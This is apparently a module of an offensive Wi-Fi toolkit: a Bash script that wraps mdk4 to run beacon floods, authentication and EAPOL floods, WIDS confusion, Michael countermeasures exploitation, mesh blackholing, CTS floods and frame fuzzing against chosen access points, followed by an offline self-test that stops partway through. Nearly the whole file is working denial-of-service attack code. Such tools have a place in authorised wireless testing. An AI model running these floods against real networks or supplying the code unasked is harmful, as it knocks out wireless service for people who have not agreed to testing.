#!/usr/bin/env bash
# Wi-Fi DoS / Flood — mdk4 beacon flood, auth DoS, WIDS confusion and
# Michael countermeasures exploitation, plus deauth.
#
# Every attack verb here injects frames and verifies nothing: mdk4 has no
# acknowledgement path, so no verb in this module claims an attack worked.
# It reports the command line it ran, the exit status and the log path.
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$HOME/wifisting/loot}"
: "${LOGS_DIR:=$HOME/wifisting/logs}"
: "${CAPTURES_DIR:=$HOME/wifisting/captures}"
: "${WIFISTING_HOME:=$HOME/wifisting}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$LOGS_DIR" "$CAPTURES_DIR" 2>/dev/null

BF_DIR="$TMP_DIR/beacon_flood"
BF_PID="$BF_DIR/mdk4.pid"
BF_LOG="$BF_DIR/mdk4.log"
BF_SSIDS="$BF_DIR/ssids.txt"
BF_RSN="$BF_DIR/rsn.txt"
# Overridable so --selftest can point the resolution at a scratch file and a
# stub iw instead of the machine's real adapter state.
BF_MON_FILE="${BF_MON_FILE:-$TMP_DIR/mon_iface}"
BF_RECON_DIR="${BF_RECON_DIR:-$TMP_DIR/recon}"
mkdir -p "$BF_DIR"

bf_get_mon() {
    if [[ -f "$BF_MON_FILE" ]]; then
        cat "$BF_MON_FILE"; return 0
    fi
    iw dev 2>/dev/null | awk '
        /Interface/ { iface=$2 }
        /type monitor/ { print iface; exit }'
}

# Every attack verb needs a monitor interface. Say exactly what is missing
# and where it was looked for: the GUI renders this line verbatim, and a
# bare "no interface" tells the operator nothing actionable.
bf_require_mon() {
    local iface
    iface=$(bf_get_mon)
    if [[ -z "$iface" ]]; then
        printf 'ERROR\tno monitor interface: %s does not exist and "iw dev" lists no interface of type monitor (create one in 01_iface)\n' \
            "$BF_MON_FILE" >&2
        return 3
    fi
    printf '%s\n' "$iface"
}

bf_require_mdk4() {
    command -v mdk4 >/dev/null 2>&1 || {
        printf 'ERROR\tmdk4 is not installed (apt install mdk4)\n' >&2
        return 4
    }
}

bf_valid_bssid() {
    [[ "$1" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]
}

bf_status_tsv() {
    local iface
    iface=$(bf_get_mon)
    local mdk4="no"
    command -v mdk4 >/dev/null 2>&1 && mdk4="yes"

    local running=0 pid=""
    if [[ -f "$BF_PID" ]]; then
        pid=$(cat "$BF_PID")
        # Liveness via /proc, never `kill -0`: an mdk4 we started as root gives
        # EPERM to an unprivileged caller, which `kill -0` reports as "gone".
        [[ "$pid" =~ ^[0-9]+$ && -d "/proc/$pid" ]] && running=1
    fi
    local ssid_count=0
    [[ -f "$BF_SSIDS" ]] && ssid_count=$(wc -l < "$BF_SSIDS")

    local band="2.4"
    [[ -f "$BF_DIR/band" ]] && band=$(cat "$BF_DIR/band")

    printf 'mon_iface\t%s\n'  "$iface"
    printf 'mdk4\t%s\n'       "$mdk4"
    printf 'running\t%s\n'    "$running"
    printf 'pid\t%s\n'        "$pid"
    printf 'ssid_count\t%s\n' "$ssid_count"
    printf 'band\t%s\n'       "$band"
    printf 'log\t%s\n'        "$BF_LOG"
}

bf_list_ssids_tsv() {
    [[ -f "$BF_SSIDS" ]] && cat "$BF_SSIDS"
}

# ── batched entropy ──
# The old generator ran `head -c 4 /dev/urandom | od` per SSID — 5+
# processes per line. For 50k SSIDs that's 250k process spawns. This
# version reads one big chunk of urandom and slices it.
bf_generate_ssids() {
    local count="${1:-1000}"
    [[ "$count" -lt 1 ]] && count=1000

    local prefix="wifisting"
    local bytes_needed=$(( (count * 8) + 64 ))

    info "generating $count SSIDs (batched entropy)"

    # Read enough entropy for all the random suffixes at once
    head -c "$bytes_needed" /dev/urandom | od -An -tx1 -v | tr -d ' \n' | \
    awk -v n="$count" -v p="$prefix" '
        {
            line = $0
            for (i = 1; i <= n; i++) {
                # 8 hex chars per suffix, taken at 8*(i-1) offset
                off = 8 * (i - 1) + 1
                suffix = substr(line, off, 8)
                if (length(suffix) < 8) suffix = suffix "00000000"
                printf "%s-%04d-%s\n", p, i, substr(suffix, 1, 8)
            }
        }
    ' > "$BF_SSIDS"

    local actual
    actual=$(wc -l < "$BF_SSIDS")
    printf 'GENERATED\t%s\nCOUNT\t%s\n' "$BF_SSIDS" "$actual"
}

bf_generate_targeted() {
    local source="$1"
    [[ -z "$source" || ! -f "$source" ]] && {
        printf 'ERROR\tsource not found\n' >&2; return 1; }
    grep -v '^$' "$source" > "$BF_SSIDS"
    printf 'GENERATED\t%s\nCOUNT\t%s\n' "$BF_SSIDS" "$(wc -l < "$BF_SSIDS")"
}

# ── RSN variants ──
# mdk4 -b supports different beacon formats:
#   -b  beacon-only
#   -p  probe responses only
#   -b -p  both (belkin flood)
#   -w  WPA2 encryption bit
#   -g  WPA3 (SAE) advertising
#   -o  OWE (Opportunistic Wireless Encryption)
#   -a  append random bytes to SSID (skip dedup on some clients)
bf_build_flags() {
    local band="$1" mode="$2" encryption="$3"
    local -a flags=()

    # Attack mode is the bare positional arg `b` in the mdk4 command
    # line. There is no `-b` flag for beacon — mdk4 4.x uses -b for
    # bitrate (needs an argument). Extra options go on top:
    #
    #   beacon   -> beacons only (no extra flag)
    #   probe    -> beacons + probe responses (-p)
    #   both     -> same as probe in practice
    case "$mode" in
        beacon) ;;              # already the default for `b`
        probe)  flags+=(-p) ;;
        both)   flags+=(-p) ;;
        *)      ;;
    esac

    # Encryption. mdk4 -w requires a letter argument, one or more of:
    #   n = none, w = WEP, t = TKIP (WPA), a = AES (WPA2)
    # mdk4 4.2 has no WPA3 support; "wpa3" and "owe" get mapped to
    # their closest valid equivalents.
    case "$encryption" in
        open)  ;;                        # default is no encryption
        wpa2)  flags+=(-w a) ;;
        wpa3)  flags+=(-w a) ;;          # mdk4 4.2 has no WPA3; use WPA2
        owe)   flags+=(-w n) ;;          # OWE is unauthenticated, closest is none
        mixed) flags+=(-w wta) ;;        # WEP + TKIP + AES
    esac

    # Band. mdk4 hops by default; -c locks a channel list.
    if [[ "$band" == "5" ]]; then
        flags+=(-c "$(seq -s, 36 4 165)")
    elif [[ "$band" == "6" ]]; then
        flags+=(-c "$(seq -s, 1 4 233)")
    fi

    printf '%s\n' "${flags[@]}"
}

# ── argv for the remaining mdk4 modes ──
# mdk4 4.2 ships ten attack modes; this module used to drive only b and d.
# The builders below emit ONE ARGUMENT PER LINE (mdk4's argv without the
# interface, which the runner prepends) so --selftest can compare the exact
# command line against a stub mdk4 that records what it was handed.
bf_build_argv() {   # MODE TARGET -> argv on stdout
    local mode="$1" target="$2"
    case "$mode" in
        auth)
            bf_valid_bssid "$target" || {
                printf 'ERROR\t--auth-flood needs the AP BSSID (aa:bb:cc:dd:ee:ff), got: %s\n' "${target:-<empty>}" >&2
                return 2
            }
            printf 'a\n-a\n%s\n' "$target"
            ;;
        michael)
            bf_valid_bssid "$target" || {
                printf 'ERROR\t--michael-shutdown needs the AP BSSID (aa:bb:cc:dd:ee:ff), got: %s\n' "${target:-<empty>}" >&2
                return 2
            }
            printf 'm\n-t\n%s\n' "$target"
            ;;
        wids)
            local ssid
            ssid=$(bf_resolve_ssid "$target") || return $?
            printf 'w\n-e\n%s\n' "$ssid"
            ;;
        eapol)
            # No flags: mdk4's e mode floods EAPOL-Start at every AP in
            # range. The Logoff variant is targeted and has its own verb.
            printf 'e\n'
            ;;
        eapol-logoff)
            bf_valid_bssid "$target" || {
                printf 'ERROR\t--eapol-logoff needs the AP BSSID (aa:bb:cc:dd:ee:ff), got: %s\n' "${target:-<empty>}" >&2
                return 2
            }
            printf 'e\n-t\n%s\n' "$target"
            ;;
        mesh)
            # -n targets a mesh ID; without it mdk4 floods every mesh it
            # hears, which is rarely what anyone means.
            [[ -n "$target" ]] || {
                printf 'ERROR\t--mesh-flood needs a mesh ID (-n), e.g. the network name\n' >&2
                return 2
            }
            printf 's\n-n\n%s\n' "$target"
            ;;
        mesh-blackhole)
            bf_valid_bssid "$target" || {
                printf 'ERROR\t--mesh-blackhole needs the mesh point MAC to impersonate\n' >&2
                return 2
            }
            printf 's\n-b\n%s\n' "$target"
            ;;
        cts)
            # -s c builds CTS frames to broadcast; the documented CTS DoS.
            printf 'f\n-s\nc\n-m\nn\n'
            ;;
        fuzz)
            printf 'f\n-s\na,b,p\n-m\ns,d,t,c\n'
            ;;
        vendor)
            if [[ -n "$target" ]]; then
                bf_valid_bssid "$target" || {
                    printf 'ERROR\t--vendor-poc target must be a BSSID\n' >&2
                    return 2
                }
                printf 'x\n-B\n%s\n' "$target"
            else
                printf 'x\n'
            fi
            ;;
        *)
            printf 'ERROR\tunknown mdk4 mode: %s\n' "$mode" >&2
            return 2
            ;;
    esac
}

# mdk4's w (WIDS confusion) mode has NO broadcast form. Its parser refuses to
# start unless -e <SSID> is given -- "Target must be specified!" -- so a verb
# that launched bare `mdk4 <iface> w` would do nothing but exit non-zero. This
# takes an SSID, or a BSSID that it resolves to an SSID out of the newest
# airodump scan CSV, and refuses with a named reason when it has neither.
bf_resolve_ssid() {   # TARGET(BSSID or SSID) -> SSID on stdout
    local target="$1" csv ssid
    if [[ -z "$target" ]]; then
        printf 'ERROR\t--wids-confuse needs a target: mdk4 w has no broadcast mode, it requires -e SSID\n' >&2
        printf 'HINT\tpass the target WDS SSID, or a BSSID that appears in %s/scan-*.csv\n' \
            "$BF_RECON_DIR" >&2
        return 2
    fi
    if ! bf_valid_bssid "$target"; then
        printf '%s\n' "$target"
        return 0
    fi
    csv=$(ls -t "$BF_RECON_DIR"/scan-*.csv 2>/dev/null | head -1)
    if [[ -z "$csv" || ! -f "$csv" ]]; then
        printf 'ERROR\tcannot resolve BSSID %s: no recon scan CSV in %s\n' "$target" "$BF_RECON_DIR" >&2
        return 3
    fi
    ssid=$(awk -F',' -v want="$(printf '%s' "$target" | tr 'A-Z' 'a-z')" '
        /^([0-9A-Fa-f][0-9A-Fa-f]:){5}[0-9A-Fa-f][0-9A-Fa-f],/ {
            b = tolower($1)
            if (b == want) {
                s = $14
                gsub(/^[ \t"]+|[ \t"]+$/, "", s)
                if (s != "") { print s; exit }
            }
        }' "$csv")
    if [[ -z "$ssid" ]]; then
        printf 'ERROR\tBSSID %s is not in %s (or advertises a hidden SSID)\n' "$target" "$(basename "$csv")" >&2
        return 3
    fi
    printf '%s\n' "$ssid"
}


bf_start() {
    local iface
    # Same gate as the one-shot verbs: one place decides what "monitor
    # interface" means, and one message says what is missing.
    iface=$(bf_require_mon) || return $?
    bf_require_mdk4 || return $?
    [[ ! -s "$BF_SSIDS" ]] && {
        printf 'ERROR\tno SSID list — generate first\n' >&2; return 1; }

    local _bf_old=""
    [[ -f "$BF_PID" ]] && _bf_old=$(cat "$BF_PID")
    if [[ "$_bf_old" =~ ^[0-9]+$ && -d "/proc/$_bf_old" ]]; then
        printf 'ERROR\tflood already running (pid %s)\n' "$_bf_old" >&2; return 1
    fi

    local band="2.4" mode="beacon" enc="open"
    [[ -f "$BF_DIR/band" ]] && band=$(cat "$BF_DIR/band")
    [[ -f "$BF_DIR/mode" ]] && mode=$(cat "$BF_DIR/mode")
    [[ -f "$BF_DIR/enc"  ]] && enc=$(cat "$BF_DIR/enc")

    local -a flags
    mapfile -t flags < <(bf_build_flags "$band" "$mode" "$enc")

    info "starting mdk4 flood: band=$band mode=$mode enc=$enc"

    setsid mdk4 "$iface" b -f "$BF_SSIDS" -s 1000 "${flags[@]}" \
        > "$BF_LOG" 2>&1 &
    local pid=$!
    echo "$pid" > "$BF_PID"
    sleep 1

    if [[ -d "/proc/$pid" ]]; then
        printf 'STARTED\t%s\nFLAGS\t%s\n' "$pid" "${flags[*]}"
    else
        printf 'ERROR\tmdk4 failed — see %s\n' "$BF_LOG" >&2
        return 1
    fi
}

bf_stop() {
    local killed=0 pid=""
    [[ -f "$BF_PID" ]] && pid=$(cat "$BF_PID")
    if [[ -n "$pid" ]]; then
        stop_kill_pid "$pid" && killed=1
    fi
    bf_sweep_killed 'mdk4 .* b -f' && killed=1
    # The bounded verbs below run in the foreground under `timeout`, so a
    # --stop while one is running has to sweep them too or the button would
    # report success while frames keep going out.
    bf_sweep_killed 'mdk4 .* (a -a|w -e|m -t)' && killed=1

    if (( killed == 1 )); then
        rm -f "$BF_PID"
        printf 'STOPPED\t1\n'
        return 0
    fi
    if [[ -n "$pid" ]]; then
        printf 'ERROR\tmdk4 pid %s survived SIGKILL (pidfile kept)\n' "$pid" >&2
        return 1
    fi
    printf 'STOPPED\t0\n'
}

# ── bounded one-shot mdk4 runs (auth DoS, WIDS confusion, Michael) ──
# These differ from --start on purpose: they are foreground, time-boxed runs
# that return the exit status, so the GUI action finishes instead of hanging
# on a daemon. `timeout` is the only thing that ends them.
#
# Nothing here may claim the attack worked. mdk4 injects frames and reads no
# acknowledgement, so it cannot tell a frozen AP from a deaf radio; the output
# reports the argv, the exit status and the log, and says so.
bf_run_mode() {   # MODE TARGET [DURATION]
    local mode="$1" target="$2" dur="${3:-30}"
    local iface
    iface=$(bf_require_mon) || return $?
    bf_require_mdk4 || return $?

    if [[ ! "$dur" =~ ^[0-9]+$ ]]; then
        printf 'ERROR\tduration must be whole seconds, got: %s\n' "$dur" >&2
        return 2
    fi
    (( dur < 1 )) && dur=1

    local -a argv
    # NB: `mapfile < <(builder)` would swallow the builder's exit status, so
    # the argv goes through a file and the status is checked explicitly.
    local argv_file="$BF_DIR/.argv.$$" build_rc=0
    bf_build_argv "$mode" "$target" > "$argv_file" || build_rc=$?
    if (( build_rc != 0 )); then
        rm -f "$argv_file"
        return "$build_rc"
    fi
    mapfile -t argv < "$argv_file"
    rm -f "$argv_file"
    ((${#argv[@]})) || { printf 'ERROR\tcould not build an mdk4 command line\n' >&2; return 2; }

    local log="$BF_DIR/$mode.log"
    info "mdk4 $mode: iface=$iface duration=${dur}s → $log"
    printf 'CMD\tmdk4 %s %s\n' "$iface" "${argv[*]}"

    timeout --signal=INT "$dur" mdk4 "$iface" "${argv[@]}" > "$log" 2>&1
    local rc=$?
    printf 'EXIT\t%s\nDURATION\t%s\nLOG\t%s\n' "$rc" "$dur" "$log"

    case "$rc" in
        0)
            printf 'RESULT\tmdk4 exited 0 — that is not evidence the target reacted, mdk4 verifies nothing\n'
            ;;
        124|130)
            printf 'RESULT\tran for the whole %ss window and was stopped by the timer; delivery is unverified\n' "$dur"
            ;;
        *)
            printf 'ERROR\tmdk4 exited %s before the window elapsed — see %s\n' "$rc" "$log" >&2
            return "$rc"
            ;;
    esac
    return 0
}

bf_auth_flood() {   # BSSID [DURATION]
    local bssid="${1:-}" dur="${2:-30}"
    printf 'NOTE\tauthentication DoS: mdk4 sends auth frames at the AP; it reads no reply, so a frozen AP cannot be distinguished from a deaf radio.\n'
    bf_run_mode auth "$bssid" "$dur"
}

bf_wids_confuse() {   # [SSID|BSSID] [DURATION]
    local target="${1:-}" dur="${2:-30}"
    printf 'NOTE\tWIDS confusion: mdk4 needs the target WDS SSID (-e); a BSSID is resolved from the newest recon scan. There is no broadcast form.\n'
    bf_run_mode wids "$target" "$dur"
}

# The rest of mdk4's attack modes. Every one of these injects frames and
# reads no reply, so none may claim the attack worked - see bf_run_mode.
bf_eapol_flood() {        # [DURATION]
    bf_run_mode eapol "" "${1:-30}"
}
bf_eapol_logoff() {       # BSSID [DURATION]
    bf_run_mode eapol-logoff "$1" "${2:-30}"
}
bf_mesh_flood() {         # MESHID [DURATION]
    bf_run_mode mesh "$1" "${2:-30}"
}
bf_mesh_blackhole() {     # MESHPOINT_MAC [DURATION]
    bf_run_mode mesh-blackhole "$1" "${2:-30}"
}
bf_cts_flood() {          # [DURATION]
    bf_run_mode cts "" "${1:-30}"
}
bf_fuzz() {               # [DURATION]
    bf_run_mode fuzz "" "${1:-30}"
}
bf_vendor_poc() {         # [BSSID] [DURATION]
    bf_run_mode vendor "${1:-}" "${2:-30}"
}
bf_michael_shutdown() {   # BSSID [DURATION]
    local bssid="${1:-}" dur="${2:-30}"
    # Say this before the frames go out, not after: the GUI shows these lines
    # next to the button and must not oversell what mdk4 can do here.
    printf 'NOTE\tMichael countermeasures exploitation applies ONLY to APs running TKIP with the QoS extension (802.11e).\n'
    printf 'NOTE\tmdk4 itself calls the random-packet variant unreliable, and it does not use the newer -j QoS exploit; in practice this rarely shuts an AP down.\n'
    printf 'NOTE\tmdk4 verifies nothing: whether the AP entered Michael countermeasures is for you to confirm, not for this output to claim.\n'
    bf_run_mode michael "$bssid" "$dur"
}

bf_set_band() {
    local b="$1"
    case "$b" in 2.4|5|6|hop) echo "$b" > "$BF_DIR/band"; printf 'BAND\t%s\n' "$b" ;;
        *) printf 'ERROR\tband must be 2.4|5|6|hop\n' >&2; return 1 ;;
    esac
}

bf_set_mode() {
    local m="$1"
    case "$m" in beacon|probe|both) echo "$m" > "$BF_DIR/mode"; printf 'MODE\t%s\n' "$m" ;;
        *) printf 'ERROR\tmode must be beacon|probe|both\n' >&2; return 1 ;;
    esac
}

bf_set_enc() {
    local e="$1"
    case "$e" in open|wpa2|wpa3|owe|mixed) echo "$e" > "$BF_DIR/enc"; printf 'ENC\t%s\n' "$e" ;;
        *) printf 'ERROR\tenc must be open|wpa2|wpa3|owe|mixed\n' >&2; return 1 ;;
    esac
}

bf_log_tail() {
    [[ -f "$BF_LOG" ]] && tail -80 "$BF_LOG"
    return 0
}

# ── watch ──
bf_watch_hits_file() { echo "$BF_DIR/hits.tsv"; }
bf_watch_seen_file() { echo "$BF_DIR/seen_hits.txt"; }

bf_watch_reset() {
    : > "$(bf_watch_hits_file)"
    : > "$(bf_watch_seen_file)"
    printf 'RESET\n'
}

bf_watch_clients() {
    local interval="${1:-3}"
    local hits_file seen_file
    hits_file="$(bf_watch_hits_file)"
    seen_file="$(bf_watch_seen_file)"

    [[ ! -s "$BF_SSIDS" ]] && {
        printf 'ERROR\tno SSID list — generate first\n' >&2; return 1; }

    mkdir -p "$BF_DIR"
    touch "$hits_file" "$seen_file"
    printf 'WATCHING\t%d\n' "$interval" | tee -a "$hits_file"

    trap 'printf "STOPPING\n"; exit 0' INT TERM

    while true; do
        local csv
        csv=$(ls -t "$TMP_DIR/recon"/scan-*.csv 2>/dev/null | head -1)
        if [[ -n "$csv" && -f "$csv" ]]; then
            RECON_CSV="$csv" \
            FLOOD_SSIDS="$BF_SSIDS" \
            SEEN_FILE="$seen_file" \
            python3 <<'PYEOF' 2>/dev/null | stdbuf -oL tee -a "$hits_file"
import csv, os, sys, time

csv_path = os.environ["RECON_CSV"]
flood_path = os.environ["FLOOD_SSIDS"]
seen_path = os.environ["SEEN_FILE"]

try:
    with open(flood_path) as f:
        flood_ssids = set(line.strip() for line in f if line.strip())
except OSError:
    sys.exit(0)

try:
    with open(seen_path) as f:
        seen = set(line.strip() for line in f if line.strip())
except OSError:
    seen = set()

aps = {}
stations = []
try:
    fh = open(csv_path, encoding="utf-8-sig", errors="replace", newline="")
except OSError:
    sys.exit(0)

with fh:
    reader = csv.reader(fh)
    section = None; headers = []
    for raw in reader:
        row = [c.strip() for c in raw]
        if not any(row): continue
        if row[0] == "BSSID":
            section = "ap"; headers = row; continue
        if row[0] == "Station MAC":
            section = "sta"; headers = row; continue
        if section is None or not headers: continue
        row += [""] * (len(headers) - len(row))
        rec = dict(zip(headers, row))
        if section == "ap":
            bssid = rec.get("BSSID", "")
            essid = rec.get("ESSID", "")
            if bssid: aps[bssid] = essid
        elif section == "sta":
            sta = rec.get("Station MAC", "")
            bssid = rec.get("BSSID", "")
            if not sta or not bssid: continue
            if bssid.lower() in ("(not associated)", "not associated"): continue
            stations.append((sta, bssid,
                             rec.get("Power", "?"),
                             rec.get("# packets", "0")))

changed = False
for sta, bssid, power, packets in stations:
    essid = aps.get(bssid, "")
    if essid and essid in flood_ssids:
        key = f"{sta}|{bssid}|{essid}"
        if key in seen: continue
        seen.add(key); changed = True
        ts = int(time.time())
        print(f"HIT\t{ts}\t{sta}\t{bssid}\t{essid}\t{power}\t{packets}", flush=True)

if changed:
    with open(seen_path, "w") as f:
        for k in sorted(seen): f.write(k + "\n")
PYEOF
        fi
        sleep "$interval"
    done
}

bf_watch_hits_tsv() {
    local f
    f="$(bf_watch_hits_file)"
    [[ -f "$f" ]] && cat "$f" || true
}

# ── self-test ────────────────────────────────────────────────────────────
# Offline only: no radio, no root, no network, mdk4 is never launched.
# SSID/flag/pid paths are shadowed into a scratch dir under $BF_DIR and
# removed before returning; nothing outside /tmp is written.
bf_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }

    local st="$BF_DIR/selftest-$$"
    rm -rf "$st"; mkdir -p "$st"
    local BF_DIR="$st" BF_SSIDS="$st/ssids.txt" BF_PID="$st/mdk4.pid" BF_LOG="$st/mdk4.log"
    # Shadow monitor/scan resolution into the scratch dir as well: the machine
    # may well have a real monitor interface, and these checks must not depend
    # on the host's radios.
    local BF_MON_FILE="$st/mon_iface" BF_RECON_DIR="$st/recon"
    local field
    field() { awk -F'\t' -v k="$1" '$1==k{print $2}' ; }
    flags() { bf_build_flags "$@" | paste -sd' ' -; }

    # ── mdk4 flag construction ──
    chk flags-beacon-open     "$(flags 2.4 beacon open)"  ""
    chk flags-probe-open      "$(flags 2.4 probe open)"   "-p"
    chk flags-both-open       "$(flags 2.4 both open)"    "-p"
    chk flags-wpa2            "$(flags 2.4 beacon wpa2)"  "-w a"
    # mdk4 4.2 has no WPA3/OWE; the module maps them to their closest
    # valid -w argument instead of passing a flag mdk4 would reject.
    chk flags-wpa3-maps-wpa2  "$(flags 2.4 beacon wpa3)"  "-w a"
    chk flags-owe-maps-open   "$(flags 2.4 beacon owe)"   "-w n"
    chk flags-mixed           "$(flags 2.4 beacon mixed)" "-w wta"
    chk flags-unknown-enc     "$(flags 2.4 beacon bogus)" ""
    chk flags-band-5          "$(flags 5 beacon open)"    "-c $(seq -s, 36 4 165)"
    chk flags-band-6          "$(flags 6 beacon open)"    "-c $(seq -s, 1 4 233)"
    chk flags-band-24-no-lock "$(flags 2.4 beacon open)"  ""
    chk flags-combined-order  "$(flags 5 probe wpa2)"     "-p -w a -c $(seq -s, 36 4 165)"

    # ── SSID generator ──
    local gen; gen=$(bf_generate_ssids 25 2>/dev/null)
    chk generate-count   "$(printf '%s\n' "$gen" | field COUNT)" "25"
    chk generate-lines   "$(wc -l < "$BF_SSIDS")" "25"
    chk generate-format  "$(grep -cE '^wifisting-[0-9]{4}-[0-9a-f]{8}$' "$BF_SSIDS")" "25"
    chk generate-unique  "$(sort -u "$BF_SSIDS" | wc -l)" "25"
    chk generate-first   "$([[ "$(head -1 "$BF_SSIDS")" =~ ^wifisting-0001-[0-9a-f]{8}$ ]] && echo ok || echo bad)" "ok"
    chk generate-last    "$([[ "$(tail -1 "$BF_SSIDS")" =~ ^wifisting-0025-[0-9a-f]{8}$ ]] && echo ok || echo bad)" "ok"
    chk list-ssids-count "$(bf_list_ssids_tsv | wc -l)" "25"
    # count < 1 is clamped to the 1000 default rather than emitting nothing.
    chk generate-clamp-zero "$(bf_generate_ssids 0 2>/dev/null | field COUNT)" "1000"

    # ── targeted list: blank lines dropped, order preserved ──
    printf '%s\n' Alpha '' Beta '' Gamma > "$st/src.txt"
    local tgt; tgt=$(bf_generate_targeted "$st/src.txt")
    chk targeted-count   "$(printf '%s\n' "$tgt" | field COUNT)" "3"
    chk targeted-content "$(cat "$BF_SSIDS")" "$(printf '%s\n' Alpha Beta Gamma)"
    bf_generate_targeted "$st/missing.txt" >/dev/null 2>&1
    chk targeted-missing-rc "$?" "1"

    # ── band / mode / enc validation ──
    chk set-band-5        "$(bf_set_band 5)"   $'BAND\t5'
    chk set-band-file     "$(cat "$BF_DIR/band")" "5"
    chk set-band-hop      "$(bf_set_band hop)" $'BAND\thop'
    bf_set_band bogus >/dev/null 2>&1
    chk set-band-bad-rc   "$?" "1"
    chk set-band-bad-kept "$(cat "$BF_DIR/band")" "hop"
    bf_set_band 5 >/dev/null
    chk set-mode-probe    "$(bf_set_mode probe)" $'MODE\tprobe'
    bf_set_mode nonsense >/dev/null 2>&1
    chk set-mode-bad-rc   "$?" "1"
    chk set-mode-kept     "$(cat "$BF_DIR/mode")" "probe"
    chk set-enc-wpa2      "$(bf_set_enc wpa2)" $'ENC\twpa2'
    bf_set_enc plaintext >/dev/null 2>&1
    chk set-enc-bad-rc    "$?" "1"
    chk set-enc-kept      "$(cat "$BF_DIR/enc")" "wpa2"

    # ── status TSV ──
    bf_generate_ssids 25 >/dev/null 2>&1
    local stsv; stsv=$(bf_status_tsv)
    fld() { printf '%s\n' "$stsv" | awk -F'\t' -v k="$1" '$1==k{print $2}'; }
    chk status-ssid-count "$(fld ssid_count)" "25"
    chk status-band       "$(fld band)"       "5"
    chk status-running    "$(fld running)"    "0"
    chk status-log        "$(fld log)"        "$BF_LOG"

    # ── auth DoS / WIDS confusion / Michael: the argv that would be run ──
    # A stub mdk4 on PATH records the argv it is handed and exits at once, so
    # the assertion is on the real command line, not on a paraphrase of it.
    # `timeout` still bounds the call; the stub never sleeps.
    mkdir -p "$st/bin" "$st/bin_nomon"
    cat > "$st/bin/mdk4" <<'STUB'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$STUB_ARGS"
exit 0
STUB
    cat > "$st/bin/iw" <<'STUB'
#!/usr/bin/env bash
[[ "$1" == "dev" ]] && printf 'phy#0\n\tInterface wlan0\n\t\ttype monitor\n'
exit 0
STUB
    cat > "$st/bin_nomon/iw" <<'STUB'
#!/usr/bin/env bash
[[ "$1" == "dev" ]] && printf 'phy#0\n\tInterface wlan0\n\t\ttype managed\n'
exit 0
STUB
    chmod +x "$st/bin/mdk4" "$st/bin/iw" "$st/bin_nomon/iw"
    printf 'wlan0\n' > "$BF_MON_FILE"
    mkdir -p "$BF_RECON_DIR"
    cat > "$BF_RECON_DIR/scan-01.csv" <<'CSV'
BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
AA:BB:CC:DD:EE:FF, 2020-01-01 00:00:00, 2020-01-01 00:00:01, 6, 54, WPA2, CCMP, PSK, -40, 10, 0, 0.0.0.0, 7, WDS-Net,
CSV

    verb_probe() {   # NAME FUNCTION [ARGS...]
        local name="$1" fn="$2"; shift 2
        (
            export PATH="$st/bin:$PATH" STUB_ARGS="$st/args_$name.txt"
            "$fn" "$@" > "$st/out_$name" 2> "$st/err_$name"
            printf '%s' "$?" > "$st/rc_$name"
        )
    }

    verb_probe auth bf_auth_flood AA:BB:CC:DD:EE:FF 5
    chk auth-argv        "$(cat "$st/args_auth.txt")"  "wlan0 a -a AA:BB:CC:DD:EE:FF"
    chk auth-rc          "$(cat "$st/rc_auth")"    "0"
    chk auth-cmd-echoed  "$(grep -c '^CMD	mdk4 wlan0 a -a AA:BB:CC:DD:EE:FF$' "$st/out_auth")" "1"
    # mdk4 verifies nothing, so the verb must never print a success verdict.
    chk auth-no-success  "$(grep -ciE '^(OK|SUCCESS)' "$st/out_auth")" "0"

    verb_probe wids bf_wids_confuse WDS-Net 5
    chk wids-ssid-argv   "$(cat "$st/args_wids.txt")"  "wlan0 w -e WDS-Net"
    chk wids-ssid-rc     "$(cat "$st/rc_wids")"    "0"

    # A BSSID is resolved to an SSID through the newest scan CSV, because
    # mdk4's w mode takes -e <SSID> and has no broadcast form.
    verb_probe wids_bssid bf_wids_confuse AA:BB:CC:DD:EE:FF 5
    chk wids-bssid-argv  "$(cat "$st/args_wids_bssid.txt")" "wlan0 w -e WDS-Net"
    chk wids-bssid-rc    "$(cat "$st/rc_wids_bssid")"   "0"

    verb_probe wids_none bf_wids_confuse "" 5
    chk wids-no-target-rc "$(cat "$st/rc_wids_none")" "2"
    # The refusal has to name what mdk4 actually needs.
    chk wids-no-target-names-need \
        "$(grep -c -- '-e SSID' "$st/err_wids_none")" "1"

    verb_probe michael bf_michael_shutdown AA:BB:CC:DD:EE:FF 5
    chk michael-argv     "$(cat "$st/args_michael.txt")" "wlan0 m -t AA:BB:CC:DD:EE:FF"
    chk michael-rc       "$(cat "$st/rc_michael")"   "0"
    # The TKIP+QoS restriction and mdk4's own scepticism must be in the
    # output, so the GUI cannot present this as a reliable attack.
